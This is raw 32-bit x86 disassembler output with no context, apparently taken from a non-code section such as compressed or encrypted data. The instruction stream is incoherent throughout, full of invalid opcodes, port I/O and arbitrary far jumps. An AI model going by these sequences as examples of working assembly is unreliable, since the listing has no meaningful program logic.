  40fe18:	add    ah,BYTE PTR [eax+0x759fd162]
  40fe1e:	std    
  40fe1f:	push   ecx
  40fe20:	xchg   ebp,eax
  40fe21:	adc    ebx,ebp
  40fe23:	or     esi,DWORD PTR [edi]
  40fe25:	mov    BYTE PTR [ebx-0x7fa7c669],0xf3
  40fe2c:	dec    eax
  40fe2d:	je     0x40fe1e
  40fe2f:	dec    edx
  40fe30:	dec    ebp
  40fe31:	sub    edi,esi
  40fe33:	cmc    
  40fe34:	jp     0x40fdce
  40fe36:	and    DWORD PTR [esi+0x2040d195],eax
  40fe3c:	xor    DWORD PTR [esi+0x3ce1d740],edx
  40fe42:	inc    esp
  40fe43:	dec    edi
  40fe44:	jecxz  0x40fe01
  40fe46:	imul   ecx,DWORD PTR [edx-0x4afdb9f1],0xfffffff0
  40fe4d:	ja     0x40feb9
  40fe4f:	push   ss
  40fe50:	seto   ch
  40fe53:	lahf   
  40fe54:	or     al,0xed
  40fe56:	pop    ebx
  40fe57:	je     0x40fe12
  40fe59:	sbb    cl,dh
  40fe5b:	mov    DWORD PTR [esi-0x32],0x5cab4c19
  40fe62:	xor    DWORD PTR ds:0xeddf4020,0x57
  40fe69:	les    eax,FWORD PTR [ebx+edi*4+0x7c]
  40fe6d:	das    
  40fe6e:	shl    DWORD PTR [ecx+0x67],1
  40fe71:	push   ecx
  40fe72:	inc    esi
  40fe73:	rcr    DWORD PTR [esi-0x6083dcdf],0xaf
  40fe7a:	push   ecx
  40fe7b:	test   al,0x6b
  40fe7d:	loop   0x40fe47
  40fe7f:	fs sub al,0x3b
  40fe82:	data16 fidiv DWORD PTR [esi]
  40fe85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe86:	push   0xffffff90
  40fe88:	sub    ah,BYTE PTR [ecx]
  40fe8a:	push   esi
  40fe8b:	sub    eax,0x13aa10a6
  40fe90:	mov    al,0xf3
  40fe92:	cmp    eax,0x2ba1e8c
  40fe97:	hlt    
  40fe98:	mov    edi,0x90068f86
  40fe9d:	xor    eax,0x92cca805
  40fea2:	shl    BYTE PTR [esi-0x45],1
  40fea5:	xor    al,0xda
  40fea7:	loopne 0x40feb5
  40fea9:	das    
  40feaa:	mov    dh,ah
  40feac:	mov    edx,0xc110233b
  40feb1:	cs dec ebx
  40feb3:	fcmovnbe st,st(6)
  40feb5:	sbb    bh,cl
  40feb7:	jns    0x40fe65
  40feb9:	mov    cl,0x63
  40febb:	add    DWORD PTR [ebx+0x76b64d4c],ebp
  40fec1:	sti    
  40fec2:	repz adc eax,0x74075cb3
  40fec8:	or     BYTE PTR [edi-0x6e944d96],al
  40fece:	push   0x4c512b3f
  40fed3:	das    
  40fed4:	test   al,0xab
  40fed6:	lahf   
  40fed7:	push   ebx
  40fed8:	adc    eax,0x441822b1
  40fedd:	jae    0x40ff3c
  40fedf:	fdiv   DWORD PTR [ebp-0x6d]
  40fee2:	sub    cl,BYTE PTR [ecx+0x5b33d1a6]
  40fee8:	sub    al,BYTE PTR [edx+0x40dbc404]
  40feee:	and    cl,BYTE PTR [esp+ebx*8]
  40fef1:	mov    eax,ds:0xb099c65e
  40fef6:	stos   BYTE PTR es:[edi],al
  40fef7:	int3   
  40fef8:	outs   dx,BYTE PTR ds:[esi]
  40fef9:	or     ebx,DWORD PTR [ebx-0x23]
  40fefc:	xchg   edi,eax
  40fefd:	(bad)  
  40fefe:	retf   0x88fb
  40ff01:	and    eax,0xa6705da9
  40ff06:	mov    ds:0x131973fb,al
  40ff0b:	add    DWORD PTR [ecx+ecx*1-0x5c],edx
  40ff0f:	aas    
  40ff10:	cmp    al,0x3c
  40ff12:	xor    al,0xd7
  40ff14:	popa   
  40ff15:	pop    ss
  40ff16:	mov    eax,ds:0xbbeee984
  40ff1b:	outs   dx,DWORD PTR ds:[esi]
  40ff1c:	and    BYTE PTR [ecx],dl
  40ff1e:	mov    ?,WORD PTR [ebx-0x504ba7a9]
  40ff24:	sub    DWORD PTR [ecx],ebp
  40ff26:	retf   0x9256
  40ff29:	loope  0x40fec4
  40ff2b:	xchg   ecx,eax
  40ff2c:	mov    eax,ds:0x8b57b2a5
  40ff31:	lock mov bh,0xaf
  40ff34:	out    dx,eax
  40ff35:	mov    ebp,0xb32ad19f
  40ff3a:	gs push ds
  40ff3c:	dec    ebp
  40ff3d:	sbb    ebx,DWORD PTR [ebx+ebx*4-0x79dcc7bb]
  40ff44:	lock adc al,0x1f
  40ff47:	jmp    0x40ffa3
  40ff49:	out    0xd3,al
  40ff4b:	(bad)  
  40ff4c:	cdq    
  40ff4d:	popf   
  40ff4e:	mov    ebp,0x1c24032e
  40ff53:	je     0x40fee2
  40ff55:	jns    0x40ffcc
  40ff57:	cdq    
  40ff58:	test   eax,0x2a650375
  40ff5d:	ins    BYTE PTR es:[edi],dx
  40ff5e:	sbb    eax,0xfe01a0d5
  40ff63:	aas    
  40ff64:	(bad)  
  40ff65:	mul    DWORD PTR [ebx+eiz*4]
  40ff68:	fimul  DWORD PTR [edx]
  40ff6a:	mov    ds:0x41a49ba4,eax
  40ff6f:	sbb    al,0xb3
  40ff71:	cmp    ebp,eax
  40ff73:	mov    ebx,0xa4ce2836
  40ff78:	sti    
  40ff79:	add    eax,0xdddf3cfa
  40ff7e:	ja     0x40ff44
  40ff80:	adc    DWORD PTR [eax],ebp
  40ff82:	xor    eax,ebx
  40ff84:	cwde   
  40ff85:	fisub  DWORD PTR [eax-0x9dfa257]
  40ff8b:	lods   al,BYTE PTR ds:[esi]
  40ff8c:	sbb    al,0x4f
  40ff8e:	loop   0x40ffae
  40ff90:	inc    eax
  40ff91:	dec    ebx
  40ff92:	scas   al,BYTE PTR es:[edi]
  40ff93:	mov    edi,0x516ba315
  40ff98:	add    eax,0xf47fb102
  40ff9d:	mov    DWORD PTR [ebx+0x73],ecx
  40ffa0:	pop    ecx
  40ffa1:	ds adc eax,0x1332b1c4
  40ffa7:	jmp    0xbc10:0x4f6a303a
  40ffae:	sti    
  40ffaf:	push   ebx
  40ffb0:	mov    ecx,0x46762e92
  40ffb5:	mov    dh,0xd1
  40ffb7:	hlt    
  40ffb8:	push   edx
  40ffb9:	dec    esp
  40ffba:	lock xchg edi,eax
  40ffbc:	aaa    
  40ffbd:	add    dl,BYTE PTR [ebp+0x16]
  40ffc0:	or     DWORD PTR [ebx+0x27],ecx
  40ffc3:	or     al,0x99
  40ffc5:	aas    
  40ffc6:	and    DWORD PTR [ebx],eax
  40ffc8:	call   0x79fe:0x946b1150
  40ffcf:	add    eax,0x9c37bf7f
  40ffd4:	fsubr  QWORD PTR [ecx-0x37d8cbe1]
  40ffda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffdb:	js     0x40ffce
  40ffdd:	call   0x7c1344e0
  40ffe2:	adc    DWORD PTR [edx+0x46514416],0x8cf42109
  40ffec:	ret    
  40ffed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffee:	fs dec edi
  40fff0:	xchg   DWORD PTR [ecx-0x3255d1c2],ecx
  40fff6:	sbb    BYTE PTR [edx+0x61b89853],ah
  40fffc:	pop    edi
  40fffd:	inc    esp
  40fffe:	pop    edi
  40ffff:	push   ebp
  410000:	inc    DWORD PTR [edi-0x50933835]
  410006:	in     al,dx
  410007:	(bad)  
  410008:	and    esi,ebp
  41000a:	loop   0x40ffd2
  41000c:	js     0x410015
  41000e:	pop    eax
  41000f:	retf   0x24ed
  410012:	jno    0x40ffd3
  410014:	add    eax,edi
  410016:	cwde   
  410017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410018:	xor    BYTE PTR [ebx+ebx*4],bl
  41001b:	in     al,dx
  41001c:	dec    esi
  41001d:	jl     0x40ffa7
  41001f:	lea    edx,[ecx-0x44f1f3f3]
  410025:	mov    ecx,0x51b7dc42
  41002a:	hlt    
  41002b:	mov    WORD PTR [edx+0xb],es
  41002e:	push   esp
  41002f:	ins    BYTE PTR es:[edi],dx
  410030:	jecxz  0x410017
  410032:	mov    dl,0xc5
  410034:	icebp  
  410035:	sub    bh,bh
  410037:	out    0xc2,eax
  410039:	xchg   ecx,eax
  41003a:	std    
  41003b:	lock lahf 
  41003d:	adc    ebp,DWORD PTR [edi-0x6663af72]
  410043:	mov    bh,0x59
  410045:	enter  0xbcc0,0x87
  410049:	aam    0x59
  41004b:	and    ebp,eax
  41004d:	clc    
  41004e:	adc    BYTE PTR [eax],ah
  410050:	retf   0xefc
  410053:	shl    eax,cl
  410055:	stos   DWORD PTR es:[edi],eax
  410056:	dec    edx
  410057:	push   esi
  410058:	loope  0x410078
  41005a:	inc    edx
  41005b:	pushf  
  41005c:	jl     0x410078
  41005e:	aad    0x48
  410060:	sbb    eax,DWORD PTR [esi-0x539121c5]
  410066:	adc    eax,0x95aa6de6
  41006b:	push   ecx
  41006c:	pop    eax
  41006d:	push   0x70
  41006f:	arpl   WORD PTR [edx],bx
  410071:	fsub   st,st(6)
  410073:	xchg   edi,eax
  410074:	(bad)  
  410075:	adc    DWORD PTR [ebx-0x69],ecx
  410078:	fistp  WORD PTR [esi+eax*8+0x66]
  41007c:	or     bl,BYTE PTR [ebx]
  41007e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41007f:	je     0x4100d7
  410081:	jb     0x41009a
  410083:	ins    DWORD PTR es:[edi],dx
  410084:	push   ecx
  410085:	sub    DWORD PTR es:[edx+eax*1+0x43],esp
  41008a:	ret    0x8697
  41008d:	cs xchg edi,eax
  41008f:	popa   
  410090:	cmp    esp,DWORD PTR [ecx+0x3b]
  410093:	cmp    DWORD PTR [edi],esi
  410095:	fidivr WORD PTR [edx+0x4d15da06]
  41009b:	push   es
  41009c:	push   es
  41009d:	pop    ss
  41009e:	cmp    BYTE PTR ds:0xe95e9adb,ch
  4100a4:	cwde   
  4100a5:	xor    bl,0x1d
  4100a8:	dec    eax
  4100a9:	pop    edx
  4100aa:	repz adc bl,dl
  4100ad:	jno    0x410059
  4100af:	add    DWORD PTR [edx-0x2b79c51],eax
  4100b5:	dec    esp
  4100b6:	stos   BYTE PTR es:[edi],al
  4100b7:	fild   QWORD PTR [ebx+esi*2+0x30]
  4100bb:	(bad)  
  4100bc:	fcom   DWORD PTR [edi+0x15]
  4100bf:	aas    
  4100c0:	in     al,dx
  4100c1:	pop    esi
  4100c2:	jle    0x41004b
  4100c4:	xor    DWORD PTR [ebx],eax
  4100c6:	pushf  
  4100c7:	out    0xae,eax
  4100c9:	iret   
  4100ca:	sbb    DWORD PTR [esp+edi*1-0x725e9c67],esi
  4100d1:	test   al,0x12
  4100d3:	lods   al,BYTE PTR ds:[esi]
  4100d4:	mov    bh,0xec
  4100d6:	hlt    
  4100d7:	clc    
  4100d8:	xlat   BYTE PTR ds:[ebx]
  4100d9:	les    esp,FWORD PTR [edi+0x79]
  4100dc:	mov    ebp,0xa211d86d
  4100e1:	inc    esp
  4100e2:	test   eax,0xc98255ad
  4100e7:	(bad)  [eax+0x51]
  4100ea:	sbb    dl,ch
  4100ec:	adc    al,0xe3
  4100ee:	lds    esp,FWORD PTR ds:0xe46b7c3f
  4100f4:	push   es
  4100f5:	sub    DWORD PTR [ecx],ebx
  4100f7:	xor    al,0x28
  4100f9:	inc    eax
  4100fa:	xchg   edx,eax
  4100fb:	stos   DWORD PTR es:[edi],eax
  4100fc:	push   ds
  4100fd:	lds    esp,FWORD PTR [edx]
  4100ff:	add    DWORD PTR [eax+0x18],edx
  410102:	enter  0x679,0x63
  410106:	ins    BYTE PTR es:[edi],dx
  410107:	jp     0x410145
  410109:	in     eax,0xa7
  41010b:	imul   edx,DWORD PTR [eax-0x24],0x25
  41010f:	dec    esi
  410110:	and    bl,BYTE PTR [ebx-0x208ce8ce]
  410116:	mov    eax,ds:0xbd0f1283
  41011b:	fldcw  WORD PTR [esp+edx*8+0x2f]
  41011f:	test   al,0x93
  410121:	and    eax,0xb18236f7
  410126:	or     edx,esi
  410128:	(bad)  
  410129:	gs ins BYTE PTR es:[edi],dx
  41012b:	hlt    
  41012c:	mov    eax,ds:0x32f639a5
  410131:	xchg   edx,eax
  410132:	pusha  
  410133:	xchg   ebp,eax
  410134:	leave  
  410135:	or     ecx,DWORD PTR [ebp+0x27]
  410138:	mov    dl,0xa
  41013a:	lods   al,BYTE PTR ds:[esi]
  41013b:	leave  
  41013c:	cmp    esp,DWORD PTR [ecx]
  41013e:	retf   0xef5a
  410141:	popa   
  410142:	jecxz  0x4101a0
  410144:	scas   eax,DWORD PTR es:[edi]
  410145:	push   ds
  410146:	mov    ds:0x92fbece2,eax
  41014b:	test   BYTE PTR [edi-0xb],dl
  41014e:	fsub   QWORD PTR [esi-0x6960f98a]
  410154:	lds    esi,FWORD PTR [ebx]
  410156:	data16 je 0x4101d0
  410159:	xor    dl,BYTE PTR [eax+0x1916e51e]
  41015f:	outs   dx,BYTE PTR ds:[esi]
  410160:	sub    DWORD PTR [ecx],esi
  410162:	pop    edi
  410163:	mov    dl,0x19
  410165:	mov    dl,0xc2
  410167:	pop    ebp
  410168:	addr16 aas 
  41016a:	popa   
  41016b:	loope  0x4101bb
  41016d:	mov    dh,0x53
  41016f:	sub    al,0x3f
  410171:	jmp    0x82a7:0x65d5974
  410178:	inc    esi
  410179:	nop
  41017a:	jo     0x410147
  41017c:	dec    edi
  41017d:	aaa    
  41017e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41017f:	dec    edi
  410180:	jle    0x4101c2
  410182:	add    BYTE PTR [esi+eiz*2],al
  410185:	cmp    al,BYTE PTR [edx+0x27511bc2]
  41018b:	std    
  41018c:	icebp  
  41018d:	stc    
  41018e:	test   eax,0x3e15eb84
  410193:	gs push ebp
  410195:	xor    bh,BYTE PTR [ebx]
  410197:	mov    al,0xc8
  410199:	adc    al,0x21
  41019b:	xchg   edx,esp
  41019d:	cdq    
  41019e:	cmp    edx,edi
  4101a0:	sbb    edi,ecx
  4101a2:	fcomp  st(6)
  4101a4:	out    dx,al
  4101a5:	jne    0x41014a
  4101a7:	lods   al,BYTE PTR ds:[esi]
  4101a8:	dec    ebx
  4101a9:	sub    dl,BYTE PTR [ecx+0x43]
  4101ac:	imul   esi,DWORD PTR [eax-0x448b3037],0xbd10f755
  4101b6:	pop    ds
  4101b7:	xchg   esp,eax
  4101b8:	mov    ds:0xb402d88b,eax
  4101bd:	retf   
  4101be:	dec    ebx
  4101bf:	mov    ebp,0x64328ca
  4101c4:	push   esi
  4101c5:	imul   edx,DWORD PTR [edi-0x10f33d76],0xffffffa0
  4101cc:	std    
  4101cd:	cmp    bh,BYTE PTR [esi-0x75]
  4101d0:	mov    esp,0x47ed3757
  4101d5:	jge    0x41017e
  4101d7:	and    edx,edi
  4101d9:	imul   ebp,DWORD PTR [ecx],0xe5f31243
  4101df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101e0:	fadd   st,st(1)
  4101e2:	(bad)  
  4101e3:	cmp    esp,DWORD PTR [ebp-0x2a1822c2]
  4101e9:	bound  ecx,QWORD PTR [edi+0xb]
  4101ec:	push   eax
  4101ed:	call   0x822f:0xd0bc00af
  4101f4:	push   0xffffffe6
  4101f6:	xor    BYTE PTR [esi+ebx*2-0x588ea930],bh
  4101fd:	mov    WORD PTR [esp+edx*1+0x4ffbd1dc],cs
  410204:	retf   
  410205:	and    esi,edx
  410207:	fcom   DWORD PTR [eax-0x20cc3d7a]
  41020d:	js     0x410229
  41020f:	jns    0x4101f0
  410211:	sar    BYTE PTR [ecx-0x47],1
  410214:	scas   al,BYTE PTR es:[edi]
  410215:	cmp    dl,BYTE PTR [eax-0x47]
  410218:	jbe    0x4101c8
  41021a:	xor    eax,DWORD PTR [ecx-0x7932d0f2]
  410220:	mov    al,ds:0x2d925f7f
  410225:	xchg   ebx,eax
  410226:	xor    al,0xf1
  410228:	ror    DWORD PTR [eax],0x90
  41022b:	dec    ecx
  41022c:	bound  edx,QWORD PTR [ebx-0x3a247e9]
  410232:	in     al,dx
  410233:	fmul   QWORD PTR [ebp+0x2c]
  410236:	push   edx
  410237:	sub    edi,DWORD PTR [ebx]
  410239:	or     dl,bl
  41023b:	enter  0xa614,0xa1
  41023f:	mov    al,ds:0x56900ed1
  410244:	add    cl,BYTE PTR [ecx+0x272393ea]
  41024a:	adc    ecx,DWORD PTR [edx]
  41024c:	lea    edi,[esi+ecx*8]
  41024f:	adc    BYTE PTR [edx+0x5c],bl
  410252:	mov    ecx,0x6e8a8493
  410257:	mov    al,BYTE PTR [eax+0x7]
  41025a:	out    dx,al
  41025b:	je     0x4102ba
  41025d:	add    eax,0xdb2bd635
  410262:	mov    bh,0x26
  410264:	xchg   esi,eax
  410265:	(bad)  
  410266:	daa    
  410267:	jg     0x410248
  410269:	(bad)  
  41026a:	(bad)  
  41026c:	xchg   DWORD PTR [eax],edx
  41026e:	dec    ebx
  41026f:	mov    eax,ds:0x6dbb04f6
  410274:	jno    0x4102c8
  410276:	leave  
  410277:	enter  0xbe72,0xdb
  41027b:	clc    
  41027c:	loope  0x4102ad
  41027e:	test   edx,0xcc3f4169
  410284:	and    esi,DWORD PTR [esi]
  410286:	mov    al,ds:0xa2c98f42
  41028b:	cmp    al,0xc8
  41028d:	and    bl,BYTE PTR [edx]
  41028f:	in     eax,dx
  410290:	and    BYTE PTR [esi-0x75],al
  410293:	ds (bad) 
  410296:	jne    0x41023b
  410298:	mov    esp,0x808a2004
  41029d:	lahf   
  41029e:	and    cl,dl
  4102a0:	stos   DWORD PTR es:[edi],eax
  4102a1:	pop    ebp
  4102a2:	cmp    DWORD PTR [ebp+0x3c],eax
  4102a5:	bound  edx,QWORD PTR ds:0x5ffd878a
  4102ab:	pop    ebp
  4102ac:	aas    
  4102ad:	xor    ebp,DWORD PTR [ecx+0x21f5e080]
  4102b3:	push   eax
  4102b4:	adc    BYTE PTR [ecx-0x3f23cd3c],bl
  4102ba:	xor    al,0x5a
  4102bc:	pop    ecx
  4102bd:	bound  eax,QWORD PTR [ebp+0x2a]
  4102c0:	add    dh,BYTE PTR [ebp-0x6b]
  4102c3:	jo     0x410270
  4102c5:	ret    
  4102c6:	sahf   
  4102c7:	adc    esp,0xa530dd7e
  4102cd:	(bad)  
  4102cf:	into   
  4102d0:	mov    ch,0x1
  4102d2:	test   eax,0x498db034
  4102d7:	(bad)  
  4102d8:	push   edx
  4102d9:	test   BYTE PTR [edx],al
  4102db:	push   esi
  4102dc:	push   0xa0a095a4
  4102e1:	pop    esi
  4102e2:	outs   dx,BYTE PTR ds:[esi]
  4102e3:	jge    0x4102c2
  4102e5:	mov    dl,0x6f
  4102e7:	data16 ja 0x4102e8
  4102ea:	imul   ecx,ebp,0x911fa897
  4102f0:	sbb    eax,0x2549b704
  4102f5:	clc    
  4102f6:	jge    0x41032c
  4102f8:	nop
  4102f9:	(bad)  
  4102fa:	and    esp,DWORD PTR [edx+0x39]
  4102fd:	sub    al,0xd
  4102ff:	xchg   DWORD PTR [ecx+0x2ba7b2f],ebx
  410305:	push   ebp
  410306:	pop    es
  410307:	test   BYTE PTR [eax-0x31],0x8c
  41030b:	loope  0x4102fe
  41030d:	cmp    DWORD PTR [ecx],0x2bd0ea1e
  410313:	leave  
  410314:	add    al,0x8e
  410316:	or     esi,DWORD PTR [esi]
  410318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410319:	mov    al,ds:0x129135bd
  41031e:	push   edi
  41031f:	nop
  410320:	les    eax,FWORD PTR [eax+0x47]
  410323:	push   cs
  410324:	pop    ds
  410325:	push   esp
  410326:	mov    ?,esp
  410328:	xor    esi,DWORD PTR [eax+eax*8-0x33fe9a3d]
  41032f:	ss stc 
  410331:	xor    BYTE PTR [eax-0x3c1c9080],dh
  410337:	jg     0x410332
  410339:	ins    DWORD PTR es:[edi],dx
  41033a:	jecxz  0x410346
  41033c:	mov    WORD PTR [esi],?
  41033e:	bound  esi,QWORD PTR [eax-0x2e]
  410341:	adc    al,0xe5
  410343:	leave  
  410344:	push   esi
  410345:	out    dx,eax
  410346:	jge    0x4103c0
  410348:	push   0xffffffe9
  41034a:	or     BYTE PTR [edi-0x3e58114b],bh
  410350:	mov    esp,0x57acdf2a
  410355:	adc    DWORD PTR [ecx],esi
  410357:	ins    BYTE PTR es:[edi],dx
  410358:	mov    BYTE PTR [edi-0x60],dl
  41035b:	loop   0x410338
  41035d:	adc    ebp,DWORD PTR [edi-0x11f73a7]
  410363:	xchg   esp,eax
  410364:	retf   
  410365:	cmp    al,0x7b
  410367:	rcr    DWORD PTR [ebp+0x25458748],1
  41036d:	in     al,dx
  41036e:	add    BYTE PTR [ebp+0x67],0xe3
  410372:	outs   dx,DWORD PTR ds:[esi]
  410373:	sbb    BYTE PTR [edi-0x5e],ch
  410376:	sbb    DWORD PTR [ecx],0x486b4d8f
  41037c:	out    0x5b,eax
  41037e:	shl    DWORD PTR [ebx+0x1fd973ca],1
  410384:	std    
  410385:	fwait
  410386:	or     eax,0x5f79c0c6
  41038b:	je     0x410333
  41038d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41038e:	cmc    
  41038f:	(bad)  
  410390:	in     eax,dx
  410391:	ds enter 0xbe6c,0xd3
  410396:	mov    esi,0x18f74c8d
  41039b:	sqrtps xmm5,XMMWORD PTR ds:0x12537d4c
  4103a2:	pushf  
  4103a3:	test   BYTE PTR [ecx-0x3f],al
  4103a6:	ins    DWORD PTR es:[edi],dx
  4103a7:	xchg   DWORD PTR [eax-0x5c8a7e88],edx
  4103ad:	fild   QWORD PTR [edx+edi*2-0x1deb7cbd]
  4103b4:	sar    BYTE PTR [ecx+0x183a1a06],1
  4103ba:	ret    
  4103bb:	(bad)  
  4103bc:	call   FWORD PTR [ecx]
  4103be:	add    eax,0x5bcd5552
  4103c3:	mov    ecx,0xd08fdbed
  4103c8:	lods   al,BYTE PTR ds:[esi]
  4103c9:	rcr    DWORD PTR [esi-0x5f2fb483],cl
  4103cf:	test   eax,0xf1450dbc
  4103d4:	and    esi,0xd095db0
  4103da:	dec    esi
  4103db:	data16 into 
  4103dd:	popf   
  4103de:	or     ebx,DWORD PTR [eax+0x3d]
  4103e1:	or     BYTE PTR [ecx+edx*8+0x4a],bh
  4103e5:	ins    BYTE PTR es:[edi],dx
  4103e6:	inc    eax
  4103e7:	test   eax,0x146c28a3
  4103ec:	stc    
  4103ed:	mov    bh,0xbb
  4103ef:	imul   esi,DWORD PTR [ebx+edi*1-0x14],0x6fc916ec
  4103f7:	push   eax
  4103f8:	push   ebx
  4103f9:	and    eax,0x625775d2
  4103fe:	dec    ebx
  4103ff:	and    al,0xaa
  410401:	inc    eax
  410402:	outs   dx,BYTE PTR ds:[esi]
  410403:	xor    edx,ecx
  410405:	jge    0x410387
  410407:	and    eax,0x16e04d1d
  41040c:	sub    ch,BYTE PTR [edx-0x1c]
  41040f:	ficomp DWORD PTR [eax-0xf]
  410412:	or     eax,0xf0a89e8
  410417:	xlat   BYTE PTR ds:[ebx]
  410418:	pop    edi
  410419:	daa    
  41041a:	add    dl,dl
  41041c:	push   ebx
  41041d:	adc    DWORD PTR [ebx+0x35],0xcb97e4ec
  410424:	(bad)  
  410425:	mov    ah,0x23
  410427:	jg     0x4103bd
  410429:	mov    ds:0x1850de0e,eax
  41042e:	outs   dx,DWORD PTR ds:[esi]
  41042f:	pop    edi
  410430:	popa   
  410431:	ja     0x410464
  410433:	outs   dx,BYTE PTR ds:[esi]
  410434:	arpl   WORD PTR [edi],ax
  410436:	cmp    al,0xdf
  410438:	fiadd  DWORD PTR [edx-0x60eb852]
  41043e:	fdiv   st,st(1)
  410440:	out    dx,eax
  410441:	push   esi
  410442:	out    0xaa,al
  410444:	in     al,0x88
  410446:	inc    esi
  410447:	pop    es
  410448:	gs mov dh,0xd2
  41044b:	dec    esi
  41044c:	in     eax,0xcf
  41044e:	nop
  41044f:	xor    DWORD PTR [ebx+0xa],ebp
  410452:	mov    ds:0x63f8c5c4,al
  410457:	sub    eax,eax
  410459:	inc    edi
  41045a:	xor    edi,DWORD PTR [ecx-0x59]
  41045d:	jb     0x41043d
  41045f:	imul   ecx,DWORD PTR [esp+eax*4],0x75
  410463:	popa   
  410464:	fistp  QWORD PTR [edx-0x5]
  410467:	xchg   DWORD PTR [esi-0x24],esp
  41046a:	inc    esi
  41046b:	mov    ds:0x1789adcd,al
  410470:	in     eax,0xed
  410472:	(bad)  
  410473:	jg     0x41048d
  410475:	enter  0x3fe0,0x51
  410479:	retf   0xf58e
  41047c:	inc    esi
  41047d:	lea    esp,[edi+ebx*2]
  410480:	push   cs
  410481:	push   ds
  410482:	adc    DWORD PTR [ebp+0x3e1f8759],ebp
  410488:	push   ebx
  410489:	js     0x4104e9
  41048b:	fsub   DWORD PTR [ecx-0x44]
  41048e:	pop    esp
  41048f:	cmp    al,0xb0
  410491:	push   0x280ccb13
  410496:	sbb    eax,0xd95b83ba
  41049b:	jge    0x410459
  41049d:	jae    0x4104b2
  41049f:	in     eax,0xff
  4104a1:	inc    ebp
  4104a2:	rcr    BYTE PTR [eax+0x4f4ae7cb],0x4d
  4104a9:	pop    ds
  4104aa:	mov    ah,0xb2
  4104ac:	sub    dl,BYTE PTR [ebx-0x24]
  4104af:	dec    ebp
  4104b0:	ins    BYTE PTR es:[edi],dx
  4104b1:	ins    DWORD PTR es:[edi],dx
  4104b2:	mov    eax,0x432cea75
  4104b7:	test   al,0x8d
  4104b9:	adc    DWORD PTR [edx+0x7f779e59],eax
  4104bf:	sub    ah,BYTE PTR [edi-0x55c94a6d]
  4104c5:	mov    eax,0xd03db669
  4104ca:	hlt    
  4104cb:	aaa    
  4104cc:	retf   0xb2b8
  4104cf:	imul   esp,DWORD PTR [edx-0x24],0x48
  4104d3:	cmp    BYTE PTR [esi-0x7d],ah
  4104d6:	pop    ds
  4104d7:	sub    bh,0xae
  4104da:	and    DWORD PTR [esi-0x63],ebx
  4104dd:	jns    0x4104e1
  4104df:	ret    0x9e08
  4104e2:	xor    dh,BYTE PTR [esi-0x506778ab]
  4104e8:	mov    esi,0x7f42af4d
  4104ee:	dec    eax
  4104ef:	cmp    al,0x7
  4104f1:	sbb    dl,BYTE PTR [ebp+0x1530b426]
  4104f7:	ds mov edx,0xcf796e10
  4104fd:	add    dh,BYTE PTR [ecx+0x2bd06eb7]
  410503:	and    al,0x61
  410505:	push   ebp
  410506:	push   edx
  410507:	push   ds
  410508:	ins    DWORD PTR es:[edi],dx
  410509:	jae    0x410510
  41050b:	push   ds
  41050c:	adc    BYTE PTR [ebx],dl
  41050e:	outs   dx,DWORD PTR ds:[esi]
  41050f:	pop    eax
  410510:	iret   
  410511:	push   ecx
  410512:	(bad)  
  410513:	shr    DWORD PTR [ebp-0x3c7b8287],0x31
  41051a:	lock mov al,ds:0x9c66d64a
  410520:	mov    edx,0xb5ac4fff
  410525:	xchg   ebp,eax
  410526:	ds pushf 
  410528:	pop    ebp
  410529:	sbb    BYTE PTR [ecx+0x304665ec],dl
  41052f:	push   ebx
  410530:	sbb    ebx,ebp
  410532:	cmp    DWORD PTR [edi+0xa],edi
  410535:	arpl   bp,dx
  410537:	js     0x410582
  410539:	fld    DWORD PTR [edx]
  41053b:	sbb    BYTE PTR [esp+edx*2],ah
  41053e:	js     0x410596
  410540:	pop    ds
  410541:	ds jmp 0x1a353195
  410547:	adc    DWORD PTR [ebp-0x33],0x8604d393
  41054e:	(bad)  [ecx-0x328d95f0]
  410554:	sub    DWORD PTR [edx],eax
  410556:	mov    WORD PTR [esi-0x18],?
  410559:	pslld  mm1,mm5
  41055c:	push   0x47c00e5d
  410561:	push   ds
  410562:	idiv   BYTE PTR [ecx-0x56]
  410565:	cmp    ebp,eax
  410567:	out    0xc3,al
  410569:	xchg   ecx,eax
  41056a:	mov    ah,0xf6
  41056c:	bound  esi,QWORD PTR [ecx+0x7]
  41056f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410570:	jnp    0x410552
  410572:	sbb    ch,BYTE PTR [edx]
  410574:	xchg   DWORD PTR [esi+0x78],ebx
  410577:	inc    esp
  410578:	add    DWORD PTR [edi+0x50],edx
  41057b:	add    esi,DWORD PTR [ecx+0x39099ebf]
  410581:	pop    ebp
  410582:	xor    BYTE PTR [ebx+0x2],dh
  410585:	xchg   edi,eax
  410586:	(bad)  
  410587:	jno    0x410535
  410589:	inc    esp
  41058a:	fcomp  DWORD PTR [ebp+0x0]
  41058d:	call   0xfa23:0x6f4cc6ab
  410594:	adc    bh,BYTE PTR [ebx+0x6c734dac]
  41059a:	xchg   bl,ah
  41059c:	daa    
  41059d:	mov    edi,0x6b228d54
  4105a2:	add    al,0x28
  4105a4:	xchg   edx,eax
  4105a5:	shr    BYTE PTR [esi+0x15db6767],cl
  4105ab:	test   DWORD PTR [eax+0x5b],ecx
  4105ae:	cmp    dh,BYTE PTR [eax-0x1dbdf077]
  4105b4:	stos   BYTE PTR es:[edi],al
  4105b5:	pop    esp
  4105b6:	mov    ecx,0xfca3cd6c
  4105bb:	ret    0x8962
  4105be:	test   al,0x46
  4105c0:	add    DWORD PTR [esp+edx*1],ebx
  4105c3:	cmp    bh,bl
  4105c5:	jmp    FWORD PTR [ebp+0x39]
  4105c8:	adc    eax,0x1f8e8fc5
  4105cd:	xor    al,BYTE PTR [eax]
  4105cf:	aas    
  4105d0:	lock fistp DWORD PTR [esi]
  4105d3:	mov    ch,0xa3
  4105d5:	stos   DWORD PTR es:[edi],eax
  4105d6:	ret    0xed7b
  4105d9:	mov    bh,0x7d
  4105db:	loop   0x410644
  4105dd:	adc    bl,BYTE PTR [ebx-0x1b]
  4105e0:	mov    cl,0xbe
  4105e2:	jmp    0x4a3878c3
  4105e7:	rol    DWORD PTR [ebx+eiz*4-0x5e],1
